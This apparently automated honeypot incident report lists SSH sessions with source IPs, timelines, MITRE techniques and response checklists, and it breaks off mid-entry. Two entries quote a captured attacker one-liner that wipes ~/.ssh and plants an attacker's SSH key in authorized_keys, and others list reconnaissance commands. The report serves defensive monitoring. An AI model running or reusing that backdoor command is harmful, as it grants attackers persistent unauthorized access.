| **First Seen** | 2026-08-04 02:06 |
| **Last Seen** | 2026-08-04 02:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:06:47` | `cowrie.session.connect` |
| `2026-08-04 02:06:47` | `cowrie.client.version` |
| `2026-08-04 02:06:47` | `cowrie.client.kex` |
| `2026-08-04 02:06:48` | `cowrie.login.success` |
| `2026-08-04 02:06:49` | `cowrie.direct-tcpip.request` |
| `2026-08-04 02:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ee067a2ba3e

| Field | Detail |
|---|---|
| **Source IP** | `110.25.107[.]25` |
| **First Seen** | 2026-08-04 02:06 |
| **Last Seen** | 2026-08-04 02:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:06:54` | `cowrie.session.connect` |
| `2026-08-04 02:06:55` | `cowrie.client.version` |
| `2026-08-04 02:06:55` | `cowrie.client.kex` |
| `2026-08-04 02:06:56` | `cowrie.login.success` |
| `2026-08-04 02:06:57` | `cowrie.direct-tcpip.request` |
| `2026-08-04 02:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.25.107[.]25` to AbuseIPDB if not already reported
- [ ] Block `110.25.107[.]25` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b85f98ab1c08

| Field | Detail |
|---|---|
| **Source IP** | `65.20.205[.]197` |
| **First Seen** | 2026-08-04 02:08 |
| **Last Seen** | 2026-08-04 02:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:08:17` | `cowrie.session.connect` |
| `2026-08-04 02:08:17` | `cowrie.client.version` |
| `2026-08-04 02:08:17` | `cowrie.client.kex` |
| `2026-08-04 02:08:18` | `cowrie.login.success` |
| `2026-08-04 02:08:19` | `cowrie.direct-tcpip.request` |
| `2026-08-04 02:08:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.205[.]197` to AbuseIPDB if not already reported
- [ ] Block `65.20.205[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d419ed394885

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-08-04 02:08 |
| **Last Seen** | 2026-08-04 02:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:08:28` | `cowrie.session.connect` |
| `2026-08-04 02:08:29` | `cowrie.client.version` |
| `2026-08-04 02:08:29` | `cowrie.client.kex` |
| `2026-08-04 02:08:31` | `cowrie.login.success` |
| `2026-08-04 02:08:31` | `cowrie.direct-tcpip.request` |
| `2026-08-04 02:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c014f287330e

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-04 02:23 |
| **Last Seen** | 2026-08-04 02:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:23:49` | `cowrie.session.connect` |
| `2026-08-04 02:23:49` | `cowrie.client.version` |
| `2026-08-04 02:23:49` | `cowrie.client.kex` |
| `2026-08-04 02:23:50` | `cowrie.login.success` |
| `2026-08-04 02:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d8768b96651

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-04 02:23 |
| **Last Seen** | 2026-08-04 02:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:23:49` | `cowrie.session.connect` |
| `2026-08-04 02:23:49` | `cowrie.client.version` |
| `2026-08-04 02:23:49` | `cowrie.client.kex` |
| `2026-08-04 02:23:50` | `cowrie.login.success` |
| `2026-08-04 02:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5555e9136d1

| Field | Detail |
|---|---|
| **Source IP** | `104.152.58[.]233` |
| **First Seen** | 2026-08-04 02:24 |
| **Last Seen** | 2026-08-04 02:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:24:33` | `cowrie.session.connect` |
| `2026-08-04 02:24:34` | `cowrie.client.version` |
| `2026-08-04 02:24:34` | `cowrie.client.kex` |
| `2026-08-04 02:24:35` | `cowrie.login.success` |
| `2026-08-04 02:24:35` | `cowrie.direct-tcpip.request` |
| `2026-08-04 02:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.152.58[.]233` to AbuseIPDB if not already reported
- [ ] Block `104.152.58[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1afb545a3bfa

| Field | Detail |
|---|---|
| **Source IP** | `182.73.164[.]228` |
| **First Seen** | 2026-08-04 02:24 |
| **Last Seen** | 2026-08-04 02:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:24:40` | `cowrie.session.connect` |
| `2026-08-04 02:24:41` | `cowrie.client.version` |
| `2026-08-04 02:24:41` | `cowrie.client.kex` |
| `2026-08-04 02:24:43` | `cowrie.login.success` |
| `2026-08-04 02:24:44` | `cowrie.direct-tcpip.request` |
| `2026-08-04 02:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.73.164[.]228` to AbuseIPDB if not already reported
- [ ] Block `182.73.164[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32b2290de05e

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]210` |
| **First Seen** | 2026-08-04 02:47 |
| **Last Seen** | 2026-08-04 02:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, uname -m, cat /proc/cpuinfo, /bin/busybox TEST, cat /proc` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:47:02` | `cowrie.session.connect` |
| `2026-08-04 02:47:02` | `cowrie.login.success` |
| `2026-08-04 02:47:03` | `cowrie.session.params` |
| `2026-08-04 02:47:04` | `cowrie.command.input` |
| `2026-08-04 02:47:04` | `cowrie.command.input` |
| `2026-08-04 02:47:05` | `cowrie.command.input` |
| `2026-08-04 02:47:05` | `cowrie.command.input` |
| `2026-08-04 02:47:06` | `cowrie.command.input` |
| `2026-08-04 02:47:06` | `cowrie.command.input` |
| `2026-08-04 02:47:06` | `cowrie.command.failed` |
| `2026-08-04 02:47:07` | `cowrie.log.closed` |
| `2026-08-04 02:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]210` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8318822423cd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 02:47 |
| **Last Seen** | 2026-08-04 02:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:47:09` | `cowrie.session.connect` |
| `2026-08-04 02:47:09` | `cowrie.client.version` |
| `2026-08-04 02:47:09` | `cowrie.client.kex` |
| `2026-08-04 02:47:09` | `cowrie.login.success` |
| `2026-08-04 02:47:10` | `cowrie.direct-tcpip.request` |
| `2026-08-04 02:47:10` | `cowrie.direct-tcpip.data` |
| `2026-08-04 02:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38976578a9c3

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-04 03:08 |
| **Last Seen** | 2026-08-04 03:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:08:08` | `cowrie.session.connect` |
| `2026-08-04 03:08:09` | `cowrie.client.version` |
| `2026-08-04 03:08:09` | `cowrie.client.kex` |
| `2026-08-04 03:08:10` | `cowrie.login.success` |
| `2026-08-04 03:08:10` | `cowrie.direct-tcpip.request` |
| `2026-08-04 03:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a23120ed4499

| Field | Detail |
|---|---|
| **Source IP** | `111.193.160[.]143` |
| **First Seen** | 2026-08-04 03:08 |
| **Last Seen** | 2026-08-04 03:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:08:22` | `cowrie.session.connect` |
| `2026-08-04 03:08:23` | `cowrie.client.version` |
| `2026-08-04 03:08:23` | `cowrie.client.kex` |
| `2026-08-04 03:08:24` | `cowrie.login.success` |
| `2026-08-04 03:08:31` | `cowrie.direct-tcpip.request` |
| `2026-08-04 03:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.193.160[.]143` to AbuseIPDB if not already reported
- [ ] Block `111.193.160[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc5a60876e6

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-08-04 03:17 |
| **Last Seen** | 2026-08-04 03:17 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:17:06` | `cowrie.session.connect` |
| `2026-08-04 03:17:07` | `cowrie.client.version` |
| `2026-08-04 03:17:07` | `cowrie.client.kex` |
| `2026-08-04 03:17:12` | `cowrie.login.success` |
| `2026-08-04 03:17:13` | `cowrie.direct-tcpip.request` |
| `2026-08-04 03:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5550b3457d63

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]229` |
| **First Seen** | 2026-08-04 03:17 |
| **Last Seen** | 2026-08-04 03:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:17:19` | `cowrie.session.connect` |
| `2026-08-04 03:17:20` | `cowrie.client.version` |
| `2026-08-04 03:17:20` | `cowrie.client.kex` |
| `2026-08-04 03:17:21` | `cowrie.login.success` |
| `2026-08-04 03:17:21` | `cowrie.direct-tcpip.request` |
| `2026-08-04 03:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]229` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-060c31d6be01

| Field | Detail |
|---|---|
| **Source IP** | `116.1.149[.]196` |
| **First Seen** | 2026-08-04 03:20 |
| **Last Seen** | 2026-08-04 03:25 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:20:33` | `cowrie.session.connect` |
| `2026-08-04 03:20:33` | `cowrie.client.version` |
| `2026-08-04 03:20:34` | `cowrie.client.kex` |
| `2026-08-04 03:20:35` | `cowrie.login.success` |
| `2026-08-04 03:20:37` | `cowrie.session.params` |
| `2026-08-04 03:20:37` | `cowrie.command.input` |
| `2026-08-04 03:20:37` | `cowrie.command.failed` |
| `2026-08-04 03:20:38` | `cowrie.log.closed` |
| `2026-08-04 03:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.1.149[.]196` to AbuseIPDB if not already reported
- [ ] Block `116.1.149[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25558c212654

| Field | Detail |
|---|---|
| **Source IP** | `61.76.136[.]25` |
| **First Seen** | 2026-08-04 03:26 |
| **Last Seen** | 2026-08-04 03:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:26:41` | `cowrie.session.connect` |
| `2026-08-04 03:26:41` | `cowrie.client.version` |
| `2026-08-04 03:26:41` | `cowrie.client.kex` |
| `2026-08-04 03:26:42` | `cowrie.login.success` |
| `2026-08-04 03:26:43` | `cowrie.session.params` |
| `2026-08-04 03:26:43` | `cowrie.command.input` |
| `2026-08-04 03:26:43` | `cowrie.command.failed` |
| `2026-08-04 03:26:43` | `cowrie.log.closed` |
| `2026-08-04 03:26:44` | `cowrie.session.params` |
| `2026-08-04 03:26:44` | `cowrie.command.input` |
| `2026-08-04 03:26:45` | `cowrie.session.file_download` |
| `2026-08-04 03:26:45` | `cowrie.log.closed` |
| `2026-08-04 03:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.136[.]25` to AbuseIPDB if not already reported
- [ ] Block `61.76.136[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90d374dd93be

| Field | Detail |
|---|---|
| **Source IP** | `61.76.136[.]25` |
| **First Seen** | 2026-08-04 03:26 |
| **Last Seen** | 2026-08-04 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:26:45` | `cowrie.session.connect` |
| `2026-08-04 03:26:45` | `cowrie.client.version` |
| `2026-08-04 03:26:45` | `cowrie.client.kex` |
| `2026-08-04 03:26:46` | `cowrie.login.success` |
| `2026-08-04 03:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.136[.]25` to AbuseIPDB if not already reported
- [ ] Block `61.76.136[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73486f026499

| Field | Detail |
|---|---|
| **Source IP** | `61.76.136[.]25` |
| **First Seen** | 2026-08-04 03:26 |
| **Last Seen** | 2026-08-04 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:26:46` | `cowrie.session.connect` |
| `2026-08-04 03:26:46` | `cowrie.client.version` |
| `2026-08-04 03:26:46` | `cowrie.client.kex` |
| `2026-08-04 03:26:47` | `cowrie.login.success` |
| `2026-08-04 03:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.136[.]25` to AbuseIPDB if not already reported
- [ ] Block `61.76.136[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a93a98a043f

| Field | Detail |
|---|---|
| **Source IP** | `45.194.17[.]98` |
| **First Seen** | 2026-08-04 03:26 |
| **Last Seen** | 2026-08-04 03:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:26:52` | `cowrie.session.connect` |
| `2026-08-04 03:26:52` | `cowrie.client.version` |
| `2026-08-04 03:26:53` | `cowrie.client.kex` |
| `2026-08-04 03:26:54` | `cowrie.login.success` |
| `2026-08-04 03:26:55` | `cowrie.session.params` |
| `2026-08-04 03:26:55` | `cowrie.command.input` |
| `2026-08-04 03:26:55` | `cowrie.command.failed` |
| `2026-08-04 03:26:55` | `cowrie.log.closed` |
| `2026-08-04 03:26:56` | `cowrie.session.params` |
| `2026-08-04 03:26:56` | `cowrie.command.input` |
| `2026-08-04 03:26:56` | `cowrie.session.file_download` |
| `2026-08-04 03:26:56` | `cowrie.log.closed` |
| `2026-08-04 03:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.194.17[.]98` to AbuseIPDB if not already reported
- [ ] Block `45.194.17[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01637acc57ff

| Field | Detail |
|---|---|
| **Source IP** | `45.194.17[.]98` |
| **First Seen** | 2026-08-04 03:26 |
| **Last Seen** | 2026-08-04 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:26:56` | `cowrie.session.connect` |
| `2026-08-04 03:26:56` | `cowrie.client.version` |
| `2026-08-04 03:26:57` | `cowrie.client.kex` |
| `2026-08-04 03:26:57` | `cowrie.login.success` |
| `2026-08-04 03:26:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.194.17[.]98` to AbuseIPDB if not already reported
- [ ] Block `45.194.17[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b3056a8c4f6

| Field | Detail |
|---|---|
| **Source IP** | `45.194.17[.]98` |
| **First Seen** | 2026-08-04 03:27 |
| **Last Seen** | 2026-08-04 03:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:27:00` | `cowrie.session.connect` |
| `2026-08-04 03:27:00` | `cowrie.client.version` |
| `2026-08-04 03:27:00` | `cowrie.client.kex` |
| `2026-08-04 03:27:01` | `cowrie.login.success` |
| `2026-08-04 03:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.194.17[.]98` to AbuseIPDB if not already reported
- [ ] Block `45.194.17[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659a99ef2c8c

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-08-04 03:33 |
| **Last Seen** | 2026-08-04 03:38 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:33:20` | `cowrie.session.connect` |
| `2026-08-04 03:33:20` | `cowrie.client.version` |
| `2026-08-04 03:33:20` | `cowrie.client.kex` |
| `2026-08-04 03:33:21` | `cowrie.login.success` |
| `2026-08-04 03:33:21` | `cowrie.direct-tcpip.request` |
| `2026-08-04 03:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-081f1f63e9e8

| Field | Detail |
|---|---|
| **Source IP** | `103.121.27[.]218` |
| **First Seen** | 2026-08-04 03:33 |
| **Last Seen** | 2026-08-04 03:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:33:31` | `cowrie.session.connect` |
| `2026-08-04 03:33:31` | `cowrie.client.version` |
| `2026-08-04 03:33:31` | `cowrie.client.kex` |
| `2026-08-04 03:33:33` | `cowrie.login.success` |
| `2026-08-04 03:33:34` | `cowrie.direct-tcpip.request` |
| `2026-08-04 03:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.121.27[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.121.27[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-950880f56db9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 03:39 |
| **Last Seen** | 2026-08-04 03:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:39:21` | `cowrie.session.connect` |
| `2026-08-04 03:39:21` | `cowrie.client.version` |
| `2026-08-04 03:39:21` | `cowrie.client.kex` |
| `2026-08-04 03:39:21` | `cowrie.login.success` |
| `2026-08-04 03:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f902fb89027a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 03:39 |
| **Last Seen** | 2026-08-04 03:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:39:21` | `cowrie.session.connect` |
| `2026-08-04 03:39:21` | `cowrie.client.version` |
